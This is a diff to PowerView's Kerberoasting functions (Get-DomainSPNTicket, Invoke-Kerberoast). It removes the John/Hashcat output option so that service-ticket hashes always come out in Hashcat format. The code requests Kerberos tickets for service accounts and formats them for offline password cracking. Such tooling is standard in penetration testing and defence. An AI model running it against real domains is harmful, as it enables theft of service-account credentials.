@@ -2597,11 +2597,6 @@ Specifies the service principal name to request the ticket for.
 
 Specifies a PowerView.User object (result of Get-DomainUser) to request the ticket for.
 
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'John'.
-
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
@@ -2621,9 +2616,9 @@ Request kerberos service tickets for all SPNs passed on the pipeline.
 
 .EXAMPLE
 
-Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat
+Get-DomainUser -SPN | Get-DomainSPNTicket
 
-Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.
+Request kerberos service tickets for all users with non-null SPNs.
 
 .INPUTS
 
@@ -2657,11 +2652,6 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
         [Object[]]
         $User,
-
-        [ValidateSet('John', 'Hashcat')]
-        [Alias('Format')]
-        [String]
-        $OutputFormat = 'John',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -2722,20 +2712,16 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
-                if ($OutputFormat -match 'John') {
-                    $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+                if ($DistinguishedName -ne 'UNKNOWN') {
+                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                 }
                 else {
-                    if ($DistinguishedName -ne 'UNKNOWN') {
-                        $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                    }
-                    else {
-                        $UserDomain = 'UNKNOWN'
-                    }
-
-                    # hashcat output format
-                    $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                    $UserDomain = 'UNKNOWN'
                 }
+
+                # hashcat output format (and now John's)
+                $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
@@ -2765,7 +2751,6 @@ Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, Get-Domain
 
 Uses Get-DomainUser to query for user accounts with non-null service principle
 names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
-The ticket format can be specified with -OutputFormat <John/Hashcat>.
 
 .PARAMETER Identity
 
@@ -2806,11 +2791,6 @@ Specifies the maximum amount of time the server spends searching. Default of 120
 
 Switch. Specifies that the searcher should also return deleted/tombstoned objects.
 
-.PARAMETER OutputFormat
-
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
-Defaults to 'John'.
-
 .PARAMETER Credential
 
 A [Management.Automation.PSCredential] object of alternate credentials
@@ -2824,7 +2804,7 @@ Kerberoasts all found SPNs for the current domain.
 
 .EXAMPLE
 
-Invoke-Kerberoast -Domain dev.testlab.local -OutputFormat HashCat | fl
+Invoke-Kerberoast -Domain dev.testlab.local | fl
 
 Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
 format instead of John (the default).
@@ -2887,11 +2867,6 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [Switch]
         $Tombstone,
 
-        [ValidateSet('John', 'Hashcat')]
-        [Alias('Format')]
-        [String]
-        $OutputFormat = 'John',
-
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
         $Credential = [Management.Automation.PSCredential]::Empty
@@ -2919,7 +2894,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
+        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket
     }
 
     END {
